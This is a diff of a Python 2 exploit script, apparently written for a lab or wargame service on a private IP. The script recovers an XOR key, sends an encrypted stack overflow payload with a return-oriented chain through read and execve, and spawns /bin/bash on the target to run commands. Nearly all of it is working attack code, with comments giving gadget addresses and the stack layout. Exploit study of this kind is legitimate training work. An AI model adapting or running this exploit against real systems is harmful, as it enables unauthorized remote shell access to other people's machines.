@@ -1,11 +1,26 @@
 #!/usr/bin/env python
+# The xor part is trivial. To exploit the stack, we will
+# return into the plt. First, read from our socket to
+# &keybuf (static) and then execve.
+#
+# &keybuf = 0x0804b480
+# 0x08048b0f =>  add 0x4, %esp; pop %ebx; pop %ebp
+# execve.plt     => 0x080489b6
+# read.plt       => 0x08048860
+# Stack layout:
+# [ read.plt ] [ &pop-pop-pop-ret ] [ fd(0/1) ] [ &keybuf ] [ size ]
+# [ execve.plt ] [ JUNK ] [ &keybuf ] [ &keybuf + 20 ] [ 0x00000000 ]
+#
+# What read() will see on the socket:
+# keybuf : "/bin/bash" + "\x00 * 7 +"\x00" * 4 + 0x0804b480  + "\x00" * 4
+
 import socket
 import struct
 import time
 import logging
-
 logging.basicConfig(level=logging.DEBUG)
 
+cmd = "id"
 b1l = len("[-- Enterprise configuration file encryption service --]\n")
 b2l = len("[-- encryption complete. please mention 474bd3ad-c65b-47ab-b041-602047ab8792 to support staff to retrieve your file --]\n")
 
@@ -45,48 +60,28 @@ def retrieve_xor_key(s):
     key.append(o_c ^ struct.unpack("I", x[4*i:4*(i+1)])[0])
   return key
 
-# &keyed = 0x0804b462
-# &keybuf = 0x0804b480
-# stack+0xc - &system = 0x13b804
-
-# gadget we have:
-# 0x08048b0f =>  add 0x4, %esp; pop %ebx; pop %ebp
-
-# execve.got.plt => 0x0804b3d8
-# execve.plt     => 0x080489b6
-# write.got.plt  => 0X0804b3dc
-# write.plt      => 0x080489c0
-# read.plt       => 0x08048860
-
-# Stack layout:
-# [read.plt][&pop-pop-pop-ret][fd(0/1)][&keybuf][size]
-# [execve.plt][JUNK][&keybuf][&keybug +20][0x00000000]
-
-# keybuf : "/bin/bash" + "\x00 * 7 +"\x00" * 4 + 0x0804b480 
-# 
 
 s = socket.create_connection(("192.168.122.37", "20002"))
 purge_banner(s, b1l)
 key = retrieve_xor_key(s)
-logging.debug(key)
-shellcode = "A" * (4096*32) + "B"*16  #"\xb6\x89\x04\x08" + "" + "\x80\xb4\x04\x08" * 2 + "\x00\x00\x00\x00"
+logging.debug("key: " + str(key))
+shellcode = "A" * (4096*32) + "B"*16 
 shellcode += "\x60\x88\x04\x08" + "\x0f\x8b\x04\x08" + "\x01\x00\x00\x00" + "\x80\xb4\x04\x08" + "\x1c\x00\x00\x00"
 shellcode += "\xb6\x89\x04\x08" + "JUNK" + "\x80\xb4\x04\x08" + "\x94\xb4\x04\x08" + "\x00" * 4
 cipher_shellcode =  encrypt(shellcode, key)
-#logging.debug(cipher_shellcode)
 s.send("E")
 s.send(struct.pack("I", len(cipher_shellcode)))
 s.send(cipher_shellcode)
 purge_banner(s, b2l)
 l = struct.unpack("I", s.recv(4))[0]
-print "reading", l
+logging.debug("reading " + str(l))
 x = ""
 while len(x) < l:
-  print "trying to read", l - len(x)
+  logging.debug("trying to read " + str(l - len(x)))
   x += s.recv(l - len(x))
-print repr(x[-16:])
 s.send("Q")
 s.send("/bin/bash" + "\x00"*7 + "\x00"*4 + "\x80\xb4\x04\x08" + "\x00" *4)
-s.send("id\n")
-print s.recv(1024)
+print ">>", cmd
+s.send(cmd + "\n")
+print "<<", s.recv(1024)
 
